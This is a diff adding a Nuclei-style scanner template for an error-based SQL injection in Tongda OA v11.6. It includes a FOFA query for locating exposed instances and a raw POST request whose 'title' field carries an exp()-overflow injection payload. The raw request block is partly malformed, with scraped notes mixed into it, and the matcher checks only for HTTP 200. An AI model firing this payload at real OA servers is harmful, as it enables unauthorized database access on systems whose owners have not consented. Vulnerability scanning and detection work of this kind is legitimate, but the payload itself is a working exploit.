@@ -1,0 +1,45 @@
+id: poc-bg4dqehbcq1p7c9v
+info:
+  name: 通达OA-v116-insert-sql注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bg4dqehbcq1p7c9v'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: bg4dqehbcq1p7c9v
+    fofa: app="TDXK-通达OA"
+http:
+- raw:
+  - 'POST /general/document/index.php/recv/register/insert HTTP/1.1
+
+
+    Content-Type:application/x-www-form-urlencoded
+
+
+    Accept-Encoding: gzip
+
+
+
+
+    title)values("''"^exp(if(ascii(substr(MOD(5,2),1,1))<128,1,710)))# =1&_SERVER=
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
